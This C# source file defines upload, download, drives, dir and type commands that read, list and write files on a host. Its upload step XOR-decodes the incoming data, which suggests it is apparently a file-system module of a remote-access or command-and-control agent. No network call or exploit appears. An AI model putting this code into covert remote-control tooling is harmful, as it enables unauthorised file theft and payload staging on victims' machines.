using System;
using System.IO;
using System.Text;

namespace FileSystem
{
    public class UploadCommand
    {
        public string Name => "upload";

        public string Execute(string[] args)
        {
            byte[] upstream_data = Zor(Convert.FromBase64String(args[0]), args[1]);
            string upload_path = args[2];
            File.WriteAllBytes(upload_path, upstream_data);
            return "Wrote " + upstream_data.Length.ToString() + " bytes to: " + upload_path;
        }

        private byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }
    }

    public class DownloadCommand
    {
        public string Name => "download";

        public byte[] Execute(string[] args)
        {
            string download_path = args[0];
            byte[] result = File.ReadAllBytes(download_path);
            return result;
        }
    }

    public class DrivesCommand
    {
        public string Name => "drives";

        public string Execute(string[] args)
        {
            StringBuilder result = new StringBuilder();

            foreach (DriveInfo objDrive in DriveInfo.GetDrives())
            {
                try
                {
                    result.AppendLine($"Drive {objDrive.Name}");
                    result.AppendLine($"Volume Label: {objDrive.VolumeLabel}");
                    result.AppendLine($"{objDrive.DriveFormat} drive");
                    result.AppendLine($"Total size: {Math.Round(objDrive.TotalSize / 1000000000.0, 2)} GB");
                    result.AppendLine($"Free space: {Math.Round(objDrive.TotalFreeSpace / 1000000000.0, 2)} GB");
                    result.AppendLine();
                }
                catch (UnauthorizedAccessException)
                {
                    result.AppendLine("Permission denied");
                }
            }

            return result.ToString();
        }
    }

    public class DirCommand
    {
        public string Name => "dir";

        public string Execute(string[] args)
        {
            StringBuilder result = new StringBuilder();
            string directory = Directory.GetCurrentDirectory();
            if (args.Length > 0)
            {
                directory = args[0];
            }

            if (!Directory.Exists(directory))
            {
                return $"Directory not found: {args[0]}";
            }

            result.AppendLine($" Directory of {directory}");
            string[] directories;
            try
            {
                directories = Directory.GetDirectories(directory);
            } catch (UnauthorizedAccessException)
            {
                return $"Permission Denied: {directory}";
            }

            foreach (string dir in directories)
            {
                try
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(dir);
                    string date = dirInfo.LastWriteTime.ToString("MM/dd/yyyy  hh:mm tt");
                    result.AppendLine($"{date}    <DIR>          {dirInfo.Name}");
                }
                catch (UnauthorizedAccessException)
                {
                    result.AppendLine($"Permission Denied: {dir}");
                }
            }


            string[] files;
            try
            {
                files = Directory.GetFiles(directory);
            }
            catch (UnauthorizedAccessException)
            {
                return $"Permission Denied: {directory}";
            }

            foreach (string file in files)
            {
                try
                {
                    FileInfo fileInfo = new FileInfo(file);
                    string date = fileInfo.LastWriteTime.ToString("MM/dd/yyyy  hh:mm tt");
                    result.AppendLine($"{date}    {fileInfo.Length,15:N0} {fileInfo.Name}");
                }
                catch (UnauthorizedAccessException)
                {
                    result.AppendLine($"Permission Denied: {file}");
                }
            }

            return result.ToString();
        }
    }

    public class TypeCommand
    {
        public string Name => "type";

        public string Execute(string[] args)
        {
            try
            {
                return File.ReadAllText(args[0]);
            }
            catch (UnauthorizedAccessException)
            {
                return $"Permission Denied: {args[0]}";
            }
            catch (FileNotFoundException)
            {
                return $"File {args[0]} does not exist";
            }
        }
    }
}
